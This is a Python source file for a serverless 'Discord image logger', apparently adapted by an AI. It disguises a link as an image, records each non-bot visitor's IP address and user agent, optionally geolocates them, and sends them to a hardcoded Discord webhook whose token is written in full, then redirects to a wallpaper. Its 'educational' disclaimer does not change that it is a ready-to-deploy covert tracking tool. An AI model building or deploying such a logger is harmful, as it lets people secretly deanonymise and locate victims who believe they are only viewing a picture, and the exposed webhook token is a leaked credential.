"""
Vercel Serverless Discord Image Logger - Adapted from Screenshots
Handles GET requests to log IPs via Discord webhook, then redirects to image.
Deploy as root / with rewrites—Educational/Testing Only!
"""

import base64
import json
import os  # For Vercel env IP fallback
from http.server import BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

import requests
import traceback

# App metadata
app = "Discord Image Logger"
version = "v2.0-vc"
author = "Dekrypt (Adapted by CodeMaster AI)"

# Config—tweak here!
config = {
    "webhook": "https://discord.com/api/webhooks/1439639460382773248/7fVQ1_3b2IEabj9rgMYYFfF0Byqu_su4XhdwLlfjEgxbcoU0Ex8Kv6fAsqStgBAqUYlC",
    "default_image_url": "https://www.windowslatest.com/wp-content/uploads/2024/10/Windows-XP-Bliss-Wallpaper-4K-scaled.jpg",  # Your Bliss wallpaper!
    "custom_image": True,  # Use ?url= param for overrides
    "username": "Image Logger",
    "color": "0xFF0000",  # Red embed
    "options": {
        "location": False,  # Geolocation (off for ethics/privacy)
        "explanation": True,  # Add pwned note
        "link_alerts": True,
    },
}

blacklisted_ips = ["34.", "35."]  # Skip Googlebot, etc.

# Tiny fallback PNG (1x1 red)
DEFAULT_IMAGE_B64 = "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg=="

def botcheck(ip: str, useragent: str) -> bool:
    """Check if request is from a bot or blacklisted IP."""
    if any(ip.startswith(prefix) for prefix in blacklisted_ips):
        return True
    if useragent.startswith("TelegramBot"):
        return True
    return False

def report_error(error: str):
    """Log errors to Discord."""
    try:
        requests.post(config['webhook'], json={
            "username": config['username'],
            "content": "@everyone",
            "embeds": [{
                "title": "Image Logger Error",
                "color": int(config['color'], 16),
                "description": f"Vercel invocation failed: {error}",
            }]
        }, timeout=5)
    except Exception as e:
        print(f"Error reporting failed: {e}")  # Fallback to Vercel logs

def make_report(ip: str, useragent: str, coords: str = None, endpoint: str = "/"):
    """Send IP log embed to Discord."""
    if botcheck(ip, useragent):
        return  # Skip bots

    # Optional link alert
    if config['options']['link_alerts']:
        requests.post(config['webhook'], json={
            "username": config['username'],
            "embeds": [{
                "title": "Logger Link Shared",
                "color": int(config['color'], 16),
                "description": f"Potential IP incoming from {endpoint}!",
            }]
        }, timeout=5)

    # Main embed
    fields = [
        {"name": "IP", "value": ip, "inline": True},
        {"name": "User Agent", "value": useragent[:100] + "..." if len(useragent) > 100 else useragent, "inline": False},
    ]
    if coords:
        fields.append({"name": "Coords", "value": coords, "inline": True})

    embed = {
        "title": "🖼️ IP Logged!",
        "description": f"Endpoint: {endpoint}",
        "color": int(config['color'], 16),
        "fields": fields,
    }
    if config['options']['explanation']:
        embed["description"] += "\n**Explanation:** Educational demo—pwned by image logger! (Get consent IRL)"

    try:
        requests.post(config['webhook'], json={
            "username": config['username'],
            "content": "@everyone" if config['options']['link_alerts'] else "",
            "embeds": [embed]
        }, timeout=5)
        print(f"Log sent for IP: {ip}")  # Vercel console feedback
    except Exception as e:
        report_error(str(e))

class ImageLoggerHandler(BaseHTTPRequestHandler):
    """
    Vercel-compatible handler: Inherits BaseHTTPRequestHandler.
    Vercel instantiates this per request—no need for HTTPServer.
    """
    def do_GET(self):
        try:
            parsed = urlparse(self.path)
            params = parse_qs(parsed.query)

            # Better IP detection for Vercel (from headers/env)
            ip = self.headers.get('x-forwarded-for', '').split(',')[0].strip() or \
                 os.environ.get('VERCEL_CLIENT_IP', 'unknown') or \
                 (self.client_address[0] if hasattr(self, 'client_address') else 'unknown')
            ua = self.headers.get('User-Agent', 'Unknown')
            endpoint = parsed.path or "/"

            print(f"Request from IP: {ip}, UA: {ua}, Path: {endpoint}")  # Debug log

            # Bot check
            if botcheck(ip, ua):
                self._serve_response(params)
                return

            # Optional geolocation (lightweight, non-blocking)
            coords = None
            if config['options']['location']:
                try:
                    geo_resp = requests.get(f"http://ip-api.com/json/{ip}?fields=lat,lon", timeout=3)
                    geo_data = geo_resp.json()
                    if geo_data.get('status') == 'success':
                        coords = f"{geo_data['lat']}, {geo_data['lon']}"
                except:
                    pass

            # Log to Discord
            make_report(ip, ua, coords, endpoint)

            # Serve redirect
            self._serve_response(params)

        except Exception as e:
            error_msg = f"Handler error: {str(e)}\n{traceback.format_exc()}"
            print(error_msg)  # Vercel logs
            report_error(error_msg)
            self.send_response(500)
            self.send_header('Content-Type', 'text/plain')
            self.end_headers()
            self.wfile.write(b'Internal error—check logs!')

    def _serve_response(self, params):
        """Redirect to custom/default image."""
        if not config['custom_image']:
            self._serve_fallback()
            return

        custom_img = params.get('url', [None])[0]
        target_url = custom_img or config['default_image_url']

        self.send_response(302)
        self.send_header('Location', target_url)
        self.end_headers()
        print(f"Redirecting to: {target_url}")  # Debug

    def _serve_fallback(self):
        """Tiny PNG if no redirect."""
        self.send_response(200)
        self.send_header('Content-Type', 'image/png')
        self.send_header('Content-Length', len(DEFAULT_IMAGE_B64))
        self.end_headers()
        self.wfile.write(base64.b64decode(DEFAULT_IMAGE_B64))

# Vercel auto-calls do_GET on the handler—no main needed!
